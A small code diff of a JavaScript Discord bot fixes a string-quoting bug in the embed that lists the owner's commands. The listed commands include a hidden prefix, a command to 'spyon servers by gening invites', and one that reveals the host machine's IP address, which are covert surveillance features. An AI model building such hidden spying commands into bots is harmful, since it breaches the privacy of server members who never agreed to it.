@@ -162,7 +162,7 @@ client.on('message', async message => {
                 .addField("change the bot's prefix", "cmd: prefix <new prefix which no one will know>")
                 .addField("spyon servers by gening invites", "cmd:spyon <server name>")
                 // .addField("get all loaded user info", "cmd: alluserinfo")
-                .addField('Get the host machine' / 's IP address ONLY!', "cmd: -gethostip")
+                .addField(`Get the host machine's IP address ONLY!`, "cmd: -gethostip")
 
             message.channel.send({ embed: ownercmds })
         }
